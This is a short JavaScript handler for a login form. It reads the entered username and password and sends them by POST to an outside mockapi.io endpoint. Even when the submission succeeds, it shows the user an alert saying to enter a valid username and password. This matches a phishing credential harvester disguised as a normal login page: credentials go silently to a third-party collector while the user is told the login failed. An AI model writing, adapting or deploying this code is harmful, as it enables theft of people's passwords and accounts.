document.querySelector("#loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const data = {
        username: username,
        password: password,
    };

    fetch("https://66843e4b56e7503d1adfca4b.mockapi.io/Singad/singga", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            return response.json();
        } else {
            throw new Error("Network response is not ok");
        }
    })
    .then(data => {
        console.log('Success:', data);
        alert('enter valid password and username');
    })
    .catch((error) => {
        console.error('Error:', error);
        alert('There was a problem with the login data submission.');
    });
});
